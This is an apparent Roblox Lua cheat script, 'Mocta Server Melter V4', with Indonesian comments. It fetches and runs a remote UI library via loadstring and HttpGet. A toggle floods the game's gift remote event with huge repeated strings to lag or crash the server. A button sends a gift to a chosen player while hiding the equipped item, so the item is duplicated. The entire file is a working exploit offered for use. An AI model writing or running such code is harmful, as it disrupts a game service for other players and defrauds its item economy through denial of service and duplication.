local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- // TARGET REMOTE //
local giftEvent = game:GetService("ReplicatedStorage"):WaitForChild("RemoteGUI"):WaitForChild("UGiftEvent")

-- // State Variables //
local IsLagging = false
local TargetPlayerName = ""

-- BIKIN TEKS RAKSASA (DATA BOMB)
local massiveString = string.rep("CRASH_SERVER_MEMORY_ALLOCATION_FAULT_", 10000) 

-- // Core Functions //
local function getPlayerList()
    local tbl = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer then table.insert(tbl, p.Name) end
    end
    return tbl
end

local function getAllTools()
    local tools = {}
    local bp = localPlayer:FindFirstChild("Backpack")
    if bp then 
        for _, t in ipairs(bp:GetChildren()) do 
            if t:IsA("Tool") then table.insert(tools, t) end 
        end 
    end
    local char = localPlayer.Character
    if char then 
        for _, t in ipairs(char:GetChildren()) do 
            if t:IsA("Tool") then table.insert(tools, t) end 
        end 
    end
    return tools
end

-- // UI Initialization //
local Window = Rayfield:CreateWindow({
    Name = "Mocta Server Melter V4",
    LoadingTitle = "Data Bomb & Live Tracker...",
    LoadingSubtitle = "Advanced Dupe Protocol",
    ConfigurationSaving = { Enabled = false },
    KeySystem = false,
    Theme = "DarkBlue"
})

local TabDupe = Window:CreateTab("Lag Exploiter", 4483362458)

TabDupe:CreateSection("1. Target Definition")

TabDupe:CreateDropdown({
    Name = "Pilih Akun Tumbal (Penerima)",
    Options = getPlayerList(),
    CurrentOption = {""},
    MultipleOptions = false,
    Callback = function(Option) TargetPlayerName = Option[1] end,
})

TabDupe:CreateSection("2. Heavy Payload Engine")

-- SAKLAR DATA BOMB
TabDupe:CreateToggle({
    Name = "🔥 NYALAKAN DATA BOMB",
    CurrentValue = false,
    Flag = "LagToggle",
    Callback = function(Value)
        IsLagging = Value
        if IsLagging then
            Rayfield:Notify({Title = "DATA BOMB ON", Content = "Menembakkan paket raksasa ke server...", Duration = 1})
            task.spawn(function()
                while IsLagging do
                    local heavyPayload = {
                        image = massiveString,
                        uniqueID = "JUNK_" .. tostring(math.random(1000, 9999)),
                        playerName = massiveString,
                        level = 999999,
                        brainrotName = massiveString,
                        uid = 0
                    }
                    for i = 1, 3 do
                        task.spawn(function() pcall(function() giftEvent:FireServer(heavyPayload) end) end)
                    end
                    task.wait(0.1)
                end
            end)
        else
            Rayfield:Notify({Title = "DATA BOMB OFF", Content = "Serangan dihentikan.", Duration = 1})
        end
    end,
})

TabDupe:CreateSection("3. Live Tracker & Execution")

-- PANEL LIVE TRACKER
local InventoryStatus = TabDupe:CreateParagraph({
    Title = "🎒 Live Item Tracker",
    Content = "Mencari data...\nPegang item untuk melacak jumlahnya."
})

-- BACKGROUND LOOP UNTUK UPDATE TRACKER
task.spawn(function()
    while task.wait(0.5) do
        local char = localPlayer.Character
        local equippedTool = char and char:FindFirstChildOfClass("Tool")
        
        if equippedTool then
            local targetName = equippedTool.Name
            local count = 0
            local allTools = getAllTools()
            
            for _, t in ipairs(allTools) do
                if t.Name == targetName then
                    count = count + 1
                end
            end
            
            InventoryStatus:Set({
                Title = "🎒 Live Item Tracker: AKTIF",
                Content = string.format("Item Terpegang: %s\nTotal Stok di Tas: %d Unit", targetName, count)
            })
        else
            InventoryStatus:Set({
                Title = "🎒 Live Item Tracker: STANDBY",
                Content = "Tidak ada item di tangan.\nSilakan Equip item yang ingin di-dupe."
            })
        end
    end
end)

TabDupe:CreateButton({
    Name = "🎁 EXECUTE GIFT & DESYNC",
    Callback = function()
        local target = Players:FindFirstChild(TargetPlayerName)
        if not target then return Rayfield:Notify({Title = "Error", Content = "Pilih target penerima dulu!", Duration = 3}) end

        local character = localPlayer.Character
        local equippedTool = character and character:FindFirstChildOfClass("Tool")
        if not equippedTool then return Rayfield:Notify({Title = "Error", Content = "Pegang (Equip) item yang mau di-dupe SEKARANG!", Duration = 3}) end

        local uniqueID = equippedTool:GetAttribute("uniqueID") or equippedTool:GetAttribute("UniqueID") or equippedTool:GetAttribute("UUID")
        local itemLvl = equippedTool:GetAttribute("Level") or equippedTool:GetAttribute("level") or equippedTool:GetAttribute("Lvl") or 1
        
        if not uniqueID then return Rayfield:Notify({Title = "Error", Content = "Item ini tidak punya Unique ID.", Duration = 3}) end

        local realPayload = {
            image = "rbxassetid://82142218961817",
            uniqueID = tostring(uniqueID),
            playerName = target.Name,
            level = tonumber(itemLvl),
            brainrotName = equippedTool.Name,
            uid = target.UserId
        }

        Rayfield:Notify({Title = "PAYLOAD SENT", Content = "Mengirim barang & melakukan desync...", Duration = 1})

        -- 1. KIRIM PAYLOAD ASLI
        pcall(function() giftEvent:FireServer(realPayload) end)

        -- 2. INSTANT DESYNC (Sembunyikan item)
        equippedTool.Parent = localPlayer:WaitForChild("PlayerGui")
        
        -- 3. JEDA KEMBALI
        task.delay(1.5, function()
            local backpack = localPlayer:FindFirstChild("Backpack")
            if backpack then
                equippedTool.Parent = backpack
                Rayfield:Notify({Title = "Selesai", Content = "Matikan Data Bomb dan cek panel Live Tracker!", Duration = 3})
            end
        end)
    end,
})
